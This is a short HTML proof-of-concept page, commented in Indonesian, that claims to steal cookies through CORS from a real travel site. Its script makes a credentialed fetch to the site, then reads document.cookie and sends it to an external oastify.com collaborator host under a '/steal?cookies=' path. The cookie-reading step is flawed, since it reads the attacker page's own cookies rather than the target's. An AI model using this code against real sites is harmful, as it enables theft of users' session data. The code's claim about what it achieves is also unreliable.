<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Cookie dengan CORS</title>
</head>
<body>
    <h1>POC - Ambil Cookie dengan CORS</h1>
    <script>
        fetch('https://nl.m.viator.com', {
            credentials: 'include'
        })
        .then(response => {
            if (response.ok) {
                // Setelah permintaan selesai, ambil cookie
                var cookies = document.cookie; // Mengambil semua cookie
                console.log("Cookie yang tersedia:", cookies);

                // Kirim cookie ke server penyerang
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?cookies=" + encodeURIComponent(cookies), true);
                xhr.send();
            } else {
                console.log("Permintaan tidak berhasil:", response.status);
            }
        })
        .catch(error => console.log("Gagal mengambil link:", error));
    </script>
</body>
</html>
